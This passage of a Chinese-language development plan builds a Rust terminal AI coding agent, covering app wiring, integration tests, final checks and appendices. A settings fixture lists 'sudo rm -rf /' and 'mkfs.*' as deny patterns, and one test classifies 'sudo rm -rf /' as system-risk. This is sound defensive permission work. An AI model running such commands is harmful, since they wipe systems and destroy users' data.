        let session_store: Box<dyn crate::session::store::SessionStore> =
            Box::new(crate::session::store::JsonFileStore::new(store_dir));

        // 3.5 创建/加载会话
        let session_id = self.cli_session.clone()
            .unwrap_or_else(|| chrono::Local::now().format("%Y-%m-%d-%H%M%S").to_string());

        let session_manager = if let Some(ref cli_sess) = self.cli_session {
            // 尝试加载已有会话（支持 id 和别名）
            let key = if cli_sess.chars().next().map_or(false, |c| c.is_ascii_digit()) {
                crate::session::SessionKey::Id(cli_sess.clone())
            } else {
                crate::session::SessionKey::Alias(cli_sess.clone())
            };
            match session_store.load(&key).await {
                Ok(Some(session)) => SessionManager::load(session),
                _ => SessionManager::new(session_id),
            }
        } else {
            SessionManager::new(session_id)
        };

        // 4. 初始化工具注册表
        let mut tool_registry = ToolRegistry::new();
        tool_registry.register(crate::tools::file::ReadTool);
        tool_registry.register(crate::tools::file::WriteTool);
        tool_registry.register(crate::tools::file::EditTool);
        tool_registry.register(crate::tools::search::GrepTool);
        tool_registry.register(crate::tools::search::GlobTool);
        tool_registry.register(crate::tools::bash::BashTool);
        tool_registry.register(crate::tools::web::WebFetchTool);
        tool_registry.register(crate::tools::web::WebSearchTool);

        // 5. 初始化命令注册表
        let mut command_registry = CommandRegistry::new();
        command_registry.register_all();

        // 6. 初始化 Provider 注册表
        let mut provider_registry = crate::llm::ProviderRegistry::new();

        for (name, provider_cfg) in &config.settings.providers {
            // 为每个 provider 创建 adapter（v1: 使用假模型列表）
            let models = vec![crate::llm::ModelInfo {
                id: provider_cfg.default_model.clone().unwrap_or_else(|| "default".into()),
                name: name.clone(),
                max_tokens: 128000,
            }];

            let adapter = crate::llm::openai::OpenAIAdapter::new(
                provider_cfg.base_url.clone(),
                provider_cfg.api_key.clone(),
                models,
            );

            provider_registry.register(name.clone(), Box::new(adapter));
        }

        // 6.5 加载 Hook 注册表（两级配置合并，对齐设计 §10）
        let user_hooks_path = home_dir.join(".emergence").join("hooks.json");
        let project_hooks_path = project_dir.join(".emergence").join("hooks.json");

        let mut hook_registry = HookRegistry::load(&user_hooks_path)
            .unwrap_or_else(|_| HookRegistry::new());
        if let Ok(project_hr) = HookRegistry::load(&project_hooks_path) {
            hook_registry.merge(project_hr);
        }

        // 7. 创建通道
        let (action_tx, action_rx) = mpsc::unbounded_channel();
        let (event_tx, event_rx) = mpsc::unbounded_channel();

        // 8. 启动 AgentLoop
        let mut agent_loop = AgentLoop::new(
            config,
            session_manager,
            tool_registry,
            command_registry,
            skill_registry,
            hook_registry,
            provider_registry,
            Some(session_store),
            action_rx,
            event_tx,
        );

        // 9. 在后台运行 AgentLoop
        let agent_handle = tokio::spawn(async move {
            if let Err(e) = agent_loop.run().await {
                tracing::error!("AgentLoop 错误: {}", e);
            }
        });

        // 10. 启动 TUI（阻塞直到退出）
        crate::tui::run(
            action_tx.clone(),
            event_rx,
        ).await?;

        // 11. 清理：发送 quit 并等待 agent 退出
        let _ = action_tx.send(Action::Quit);
        let _ = tokio::time::timeout(std::time::Duration::from_secs(3), agent_handle).await;

        Ok(())
    }
}

mod dirs_functions {
    use std::path::PathBuf;

    pub fn home_dir() -> Option<PathBuf> {
        std::env::var("HOME")
            .or_else(|_| std::env::var("USERPROFILE"))
            .map(PathBuf::from)
            .ok()
    }
}
```

- [ ] **步骤 2: 验证编译**

运行: `cargo build`
预期: 编译成功

- [ ] **步骤 3: 提交**

```bash
git add src/main.rs src/app.rs
git commit -m "feat: 实现完整入口 — App::run 集成配置、会话、工具、命令、Provider、TUI"
```

---

### 任务 25: 集成测试

**文件:**
- 创建: `tests/integration/agent_loop.rs`
- 创建: `tests/integration/session_persistence.rs`
- 创建: `tests/integration/config_loading.rs`
- 创建: `tests/fixtures/sample_settings.json`

- [ ] **步骤 1: 创建 tests/fixtures/sample_settings.json**

```json
{
  "version": 1,
  "model": "deepseek/deepseek-v4-pro",
  "generation": {
    "max_tokens": 32000,
    "temperature": 0.7,
    "top_p": 1.0,
    "stop_sequences": [],
    "thinking": null
  },
  "providers": {
    "deepseek": {
      "api_key": "sk-test",
      "base_url": "https://api.deepseek.com/v1",
      "default_model": "deepseek-v4-pro"
    }
  },
  "permissions": {
    "auto_approve": ["read", "grep", "glob"],
    "deny_patterns": ["sudo rm -rf /", "mkfs.*"]
  },
  "tools": {
    "disabled": []
  },
  "session": {
    "store_dir": "~/.emergence/sessions",
    "auto_save": true,
    "compaction_threshold_tokens": 80000
  }
}
```

- [ ] **步骤 2: 编写 tests/integration/session_persistence.rs**

```rust
use emergence::session::{Session, SessionManager};
use emergence::session::store::{SessionStore, JsonFileStore, SessionKey};

#[tokio::test]
async fn test_session_save_and_load_roundtrip() {
    let dir = tempfile::tempdir().unwrap();
    let store = JsonFileStore::new(dir.path().to_path_buf());

    // 创建会话并添加消息
    let mut sm = SessionManager::new("roundtrip-test".into());
    sm.begin_turn(emergence::llm::ChatMessage {
        role: emergence::llm::Role::User,
        content: emergence::llm::Content::Text("hello world".into()),
        name: None,
    });
    sm.complete_turn().unwrap();

    // 保存
    store.save(sm.session()).await.unwrap();

    // 加载
    let loaded = store.load(&SessionKey::Id("roundtrip-test".into())).await.unwrap();
    assert!(loaded.is_some());
    let session = loaded.unwrap();
    assert_eq!(session.turns.len(), 1);
    assert_eq!(session.turns[0].messages.len(), 1);
}

#[tokio::test]
async fn test_session_alias_lookup() {
    let dir = tempfile::tempdir().unwrap();
    let store = JsonFileStore::new(dir.path().to_path_buf());

    let session = Session::new("alias-test".into());
    store.save(&session).await.unwrap();
    store.set_alias("alias-test", "my-feature").await.unwrap();

    let loaded_by_alias = store.load(&SessionKey::Alias("my-feature".into())).await.unwrap();
    assert!(loaded_by_alias.is_some());
    assert_eq!(loaded_by_alias.unwrap().id, "alias-test");
}

#[tokio::test]
async fn test_delete_session() {
    let dir = tempfile::tempdir().unwrap();
    let store = JsonFileStore::new(dir.path().to_path_buf());

    let session = Session::new("delete-test".into());
    store.save(&session).await.unwrap();
    assert!(store.load(&SessionKey::Id("delete-test".into())).await.unwrap().is_some());

    store.delete(&SessionKey::Id("delete-test".into())).await.unwrap();
    assert!(store.load(&SessionKey::Id("delete-test".into())).await.unwrap().is_none());
}
```

- [ ] **步骤 3: 编写 tests/integration/config_loading.rs**

```rust
use std::io::Write;
use emergence::config::ConfigManager;

#[test]
fn test_load_settings_from_file() {
    let dir = tempfile::tempdir().unwrap();
    let emergence_dir = dir.path().join(".emergence");
    std::fs::create_dir_all(&emergence_dir).unwrap();

    let settings = serde_json::json!({
        "version": 1,
        "model": "test/test-model",
        "generation": {
            "max_tokens": 8000,
            "temperature": 0.5,
            "top_p": 0.9,
            "stop_sequences": [],
            "thinking": null
        },
        "providers": {},
        "permissions": {
            "auto_approve": ["read"],
            "deny_patterns": []
        },
        "tools": { "disabled": [] },
        "session": {
            "store_dir": "~/.emergence/sessions",
            "auto_save": true,
            "compaction_threshold_tokens": 80000
        }
    });

    std::fs::write(
        emergence_dir.join("settings.json"),
        serde_json::to_string_pretty(&settings).unwrap(),
    ).unwrap();

    let config = ConfigManager::load(
        dir.path().to_path_buf(), // home
        dir.path().to_path_buf(), // project
        None,
    ).unwrap();

    assert_eq!(config.settings.model, "test/test-model");
    assert_eq!(config.settings.generation.max_tokens, 8000);
}

#[test]
fn test_cli_model_overrides_settings() {
    let dir = tempfile::tempdir().unwrap();
    let emergence_dir = dir.path().join(".emergence");
    std::fs::create_dir_all(&emergence_dir).unwrap();
    std::fs::write(emergence_dir.join("settings.json"), "{}").unwrap();

    let config = ConfigManager::load(
        dir.path().to_path_buf(),
        dir.path().to_path_buf(),
        Some("cli-override-model".into()),
    ).unwrap();

    assert_eq!(config.settings.model, "cli-override-model");
}
```

- [ ] **步骤 4: 编写 tests/integration/agent_loop.rs**

```rust
use emergence::tools::{ToolRegistry, ToolOutput};
use emergence::permissions::{PermissionStore, RiskLevel};
use emergence::session::SessionManager;

#[tokio::test]
async fn test_tool_registry_all_tools_registered() {
    let mut registry = ToolRegistry::new();
    registry.register(emergence::tools::file::ReadTool);
    registry.register(emergence::tools::file::WriteTool);
    registry.register(emergence::tools::file::EditTool);
    registry.register(emergence::tools::search::GrepTool);
    registry.register(emergence::tools::search::GlobTool);
    registry.register(emergence::tools::bash::BashTool);
    registry.register(emergence::tools::web::WebFetchTool);
    registry.register(emergence::tools::web::WebSearchTool);

    let definitions = registry.definitions();
    assert_eq!(definitions.len(), 8, "应有 8 个工具定义");

    // 验证所有定义都有 name 和 description
    for def in &definitions {
        assert!(!def.name.is_empty());
        assert!(!def.description.is_empty());
    }
}

#[test]
fn test_permission_store_workflow() {
    let mut store = PermissionStore::new();

    // 初始状态：未批准
    assert!(!store.is_allowed("bash", RiskLevel::Write));

    // 用户批准 always
    store.approve_always("bash", RiskLevel::Write);
    assert!(store.is_allowed("bash", RiskLevel::Write));

    // 不同等级不受影响
    assert!(!store.is_allowed("bash", RiskLevel::System));

    // 清空
    store.clear();
    assert!(!store.is_allowed("bash", RiskLevel::Write));
}

#[test]
fn test_session_manager_context_building() {
    let mut sm = SessionManager::new("ctx-test".into());

    sm.begin_turn(emergence::llm::ChatMessage {
        role: emergence::llm::Role::User,
        content: emergence::llm::Content::Text("请写一个函数".into()),
        name: None,
    });

    // 模拟助手回复
    sm.push(emergence::llm::ChatMessage {
        role: emergence::llm::Role::Assistant,
        content: emergence::llm::Content::Text("好的，这是你需要的函数...".into()),
        name: None,
    }).unwrap();
    sm.complete_turn().unwrap();

    let tools = vec![emergence::llm::ToolDefinition {
        name: "read".into(),
        description: "读取文件".into(),
        parameters: serde_json::json!({"type": "object", "properties": {}}),
    }];

    let ctx = sm.build_context("You are helpful.", &tools, "", &[], None);

    // 验证 system prompt 存在
    let system_msg = ctx.first().unwrap();
    assert_eq!(system_msg.role, emergence::llm::Role::System);
    assert!(matches!(&system_msg.content, emergence::llm::Content::Text(t) if t.contains("You are helpful")));

    // 验证用户消息存在
    let user_msgs: Vec<_> = ctx.iter()
        .filter(|m| m.role == emergence::llm::Role::User)
        .collect();
    assert_eq!(user_msgs.len(), 1);
}

#[test]
fn test_bash_risk_classification() {
    use emergence::tools::bash::BashTool;
    use emergence::tools::Tool;

    // 安全命令
    let params = serde_json::json!({"command": "ls -la"});
    assert_eq!(BashTool.risk_level(&params), RiskLevel::ReadOnly);

    // 写命令
    let params = serde_json::json!({"command": "cargo build"});
    assert_eq!(BashTool.risk_level(&params), RiskLevel::Write);

    // 危险命令
    let params = serde_json::json!({"command": "sudo rm -rf /"});
    assert_eq!(BashTool.risk_level(&params), RiskLevel::System);
}
```

- [ ] **步骤 5: 运行集成测试**

运行: `cargo test`
预期: 所有单元测试和集成测试通过

- [ ] **步骤 6: 提交**

```bash
git add tests/
git commit -m "test: 添加集成测试 — session 持久化、config 加载、agent loop 模拟"
```

---

### 任务 26: 清理和最终检查

- [ ] **步骤 1: 运行完整测试套件**

运行: `cargo test`
预期: 所有测试通过

- [ ] **步骤 2: 检查编译警告**

运行: `cargo build 2>&1 | grep -i warning`
预期: 无或最小化警告

- [ ] **步骤 3: 运行 cargo clippy（如已安装）**

运行: `cargo clippy -- -D warnings 2>&1 | tail -20`
预期: 无严重警告

- [ ] **步骤 4: 检查模块完整性**

运行: `find src -name '*.rs' | sort`
预期: 以下所有文件存在
```
src/main.rs
src/lib.rs
src/app.rs
src/protocol.rs
src/config/mod.rs
src/config/settings.rs
src/config/agents_md.rs
src/llm/mod.rs
src/llm/message.rs
src/llm/registry.rs
src/llm/openai.rs
src/tools/mod.rs
src/tools/file.rs
src/tools/search.rs
src/tools/bash.rs
src/tools/web.rs
src/permissions/mod.rs
src/session/mod.rs
src/session/store.rs
src/session/context.rs
src/session/summarizer.rs
src/commands/mod.rs
src/commands/help.rs
src/commands/clear.rs
src/commands/compact_cmd.rs
src/commands/config_cmd.rs
src/commands/sessions_cmd.rs
src/commands/quit.rs
src/commands/model_cmd.rs
src/commands/tokens_cmd.rs
src/commands/tools_cmd.rs
src/commands/skills_cmd.rs
src/skills/mod.rs
src/skills/loader.rs
src/hooks/mod.rs
src/hooks/shell.rs
src/hooks/builtin.rs
src/tui/mod.rs
src/tui/widgets.rs
src/tui/popups.rs
src/tui/themes.rs
src/utils/mod.rs
src/utils/env.rs
src/utils/fuzzy.rs
```

- [ ] **步骤 5: 提交最终状态**

```bash
git add -A
git commit -m "chore: 清理、clippy 修复、模块完整性检查"
```

---

## 附录 A: 依赖清单

| crate | 版本 | 用途 |
|-------|------|------|
| `tokio` | 1 (full) | 异步运行时 |
| `ratatui` | 0.28 | TUI 框架 |
| `crossterm` | 0.28 | 终端控制 |
| `reqwest` | 0.12 | HTTP (LLM API, web tools) |
| `serde` / `serde_json` | 1 / 1 | 序列化 |
| `serde_yaml` | 0.9 | Skill frontmatter 解析 |
| `async-trait` | 0.1 | async trait 支持 |
| `tokio-stream` | 0.1 | Stream 包装 |
| `clap` | 4 | CLI 参数解析 |
| `tracing` + `tracing-subscriber` | 0.1 / 0.3 | 日志 |
| `chrono` | 0.4 | 时间戳 |
| `anyhow` | 1 | 错误处理 |
| `thiserror` | 2 | 自定义错误 |
| `futures` | 0.3 | Stream 工具 |
| `regex` | 1 | 正则（bash 分类、HTML 清洗）|
| `urlencoding` | 2 | URL 编码 |
| `html_escape` | 0.2 | HTML 实体解码 |
| mockall | 0.12 | dev: mock trait |
| tempfile | 3 | dev: 临时文件 |
| tokio-test | 0.4 | dev: 异步测试 |
| pretty_assertions | 1 | dev: 友好的断言输出 |

## 附录 B: 任务依赖图

```
任务 1 (脚手架)
  └─→ 任务 2 (消息类型)
       └─→ 任务 3 (Provider trait)
            ├─→ 任务 4 (ProviderRegistry)
            └─→ 任务 5 (OpenAI adapter → 依赖 4)
任务 6 (配置系统 → 依赖 1)
任务 7 (Tool trait + Registry → 依赖 2, 12)
  ├─→ 任务 8 (文件工具 → 依赖 7)
  ├─→ 任务 9 (搜索工具 → 依赖 7)
  ├─→ 任务 10 (Bash 工具 → 依赖 7)
  └─→ 任务 11 (Web 工具 → 依赖 7)
任务 12 (权限系统 → 独立)
任务 13 (Session 类型 → 依赖 2)
  ├─→ 任务 14 (SessionStore → 依赖 13)
  └─→ 任务 15 (ContextBuilder → 依赖 13)
任务 16 (Command trait + Registry + fuzzy → 独立)
  └─→ 任务 17 (内置命令 → 依赖 14, 16)
任务 18 (Skill 系统 → 独立)
任务 19 (Hook 系统 → 依赖 4, 7, 12)
任务 20 (协议类型 → 依赖 4, 12)
  └─→ 任务 21 (TUI → 依赖 12, 20)
任务 22 (AgentLoop Part 1 → 依赖 5, 6, 7, 12, 13, 15, 16, 18, 19, 20)
  └─→ 任务 23 (AgentLoop Part 2 → 依赖 14, 22)
任务 24 (集成 → 依赖 14, 19, 21, 23)
  └─→ 任务 25 (集成测试 → 依赖 24)
       └─→ 任务 26 (最终检查 → 依赖 25)
```

## 附录 C: 自检清单

在实现完成后，执行以下检查：

1. **Spec 覆盖:** 设计文档的 16 个章节（概述、架构、LLM Provider、Tool 系统、权限、Session、TUI、Skill、命令、Hook、数据流、配置、错误处理、测试策略、文件结构、依赖）是否都有对应任务？
2. **模块完整性:** `src/lib.rs` 是否声明了所有模块？
3. **TDD:** 每个任务是否包含测试编写 → 测试失败 → 实现 → 测试通过 → 提交的完整流程？
4. **类型一致性:** `Action`、`Event`、`RiskLevel`、`ChatMessage` 等核心类型在 TUI 和 AgentLoop 中使用一致？
5. **通信协议:** TUI ↔ AgentLoop 的 mpsc channel 方向是否正确？（Action 从 TUI 到 AgentLoop，Event 从 AgentLoop 到 TUI）
6. **状态机完整性:** AgentState 是否覆盖了 Idle → Processing → Streaming → ToolDecision → WaitingPermission → ToolExecuting → Idle 的完整路径？
